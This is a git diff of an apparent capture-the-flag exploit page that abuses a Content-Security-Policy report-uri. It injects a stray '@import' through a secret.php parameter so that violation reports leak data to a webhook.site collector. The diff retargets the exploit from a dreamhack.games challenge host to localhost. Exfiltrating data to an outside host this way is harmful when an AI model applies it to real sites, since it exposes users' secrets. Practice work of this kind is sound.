82ce22de4284d3a771c7f8541a75977ba43d79db
tadokun468 <huynhluc258@gmail.com>
2024-12-04 17:31:49 +0700

    a

--- src/index.php
+++ src/index.php
@@ -1,6 +1,6 @@
 <?php
 
-header("Content-Security-Policy: style-src http://host3.dreamhack.games:13168/secret.php; report-uri https://webhook.site/2b0e8e28-cd46-4434-b0d0-eb7f190b7ed7;");
+header("Content-Security-Policy: style-src http://localhost:8889/secret.php; report-uri https://webhook.site/97b703dc-c969-485e-85f9-14fe8881d298;");
 
 
 ?>
@@ -11,7 +11,7 @@ header("Content-Security-Policy: style-src http://host3.dreamhack.games:13168/se
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Exploit CSP with Report-URI</title>
-    <link rel="stylesheet" href="http://host3.dreamhack.games:13168/secret.php?whatUwant=@import '">
+    <link rel="stylesheet" href="http://localhost:8889/secret.php?whatUwant=@import '">
 </head>
 <body>
     <h1>Exploitation in Progress...</h1>
